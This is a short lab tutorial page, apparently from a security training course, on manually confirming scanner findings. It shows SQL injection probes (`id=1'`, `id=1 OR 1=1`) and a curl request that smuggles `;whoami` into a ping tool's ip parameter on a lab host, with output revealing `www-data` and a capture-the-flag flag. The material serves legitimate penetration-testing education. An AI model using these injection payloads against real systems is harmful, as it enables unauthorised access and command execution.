# Manual Validation

Automated scanners are loud and dumb. They scream "I AM HACKING YOU" and often miss logic flaws.
**Manual Validation** is where you prove your worth.

## The Process

1.  **Select a Finding:** Scanner says "SQL Injection possible on ID parameter".
2.  **Reproduce:** Try the payload manually (`id=1'`).
3.  **Confirm:** Did it break? Did it error? (SQL Syntax error).
4.  **Escalate:** Can you actually dump data? (`id=1 OR 1=1`).

## Lab: Validating an RCE

Nessus flagged `Command Injection` on a ping tool.
Let's verify.

Target: `http://10.10.10.20/ping.php?ip=127.0.0.1`

Try injecting a command separator `;` and `whoami`.

<TerminalWindow 
  cmd="curl 'http://10.10.10.20/ping.php?ip=127.0.0.1;whoami'" 
  output="PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
...
www-data
Flag: BL{M4nu4l_V4l1d4t10n_Is_K3y}" 
/>

The output contains `www-data`. The command executed. Vulnerability Confirmed.
